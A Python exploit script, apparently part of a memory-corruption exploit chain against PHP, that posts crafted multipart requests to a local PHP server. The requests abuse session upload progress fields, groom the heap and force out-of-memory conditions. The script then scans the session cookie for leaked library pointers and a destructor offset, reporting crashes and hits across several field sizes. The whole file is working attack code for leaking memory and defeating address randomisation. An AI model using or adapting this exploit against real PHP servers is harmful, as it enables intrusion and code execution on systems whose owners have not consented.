import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart, parse_cookie
t = Target("http://127.0.0.1:18113/index.php", timeout=120, verbose=False)
SID = b"attacksessionid0001"
dtor_offset = 0x65eb60
def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def stage2_reqb():
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        cnt = 16 if i == 406 else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    return t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)

def oom(nfields, fsize, big_mb):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * fsize} for i in range(nfields)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)

# Test more field sizes
for fsize in [2, 4, 8, 16, 24, 32, 40, 48]:
    rotate()
    oom(1001, fsize, 12)
    resp = stage2_reqb()
    if b"\r\n\r\n" in resp:
        head, body = resp.split(b"\r\n\r\n", 1)
    else:
        head, body = b"", resp
    raw = parse_cookie(resp)
    dtor_hit = False
    libptrs = 0
    if raw:
        ptrs = [int.from_bytes(raw[i:i+8], "little") for i in range(0, len(raw)-8, 8)]
        libptrs = len([v for v in ptrs if 0x700000000000 <= v < 0x800000000000])
        dtor_hit = any(v & 0xFFF == dtor_offset & 0xFFF and 0x700000000000 <= v < 0x800000000000 for v in ptrs)
    status = "CRASH" if len(resp) == 0 else ("DTOR-HIT" if dtor_hit else ("soft" if raw else "no-leak"))
    print(f"fsize={fsize:2d}: resp={len(resp):5d}B cookie={len(raw) if raw else 0:3d}B libptrs={libptrs} {status}")
    time.sleep(0.3)
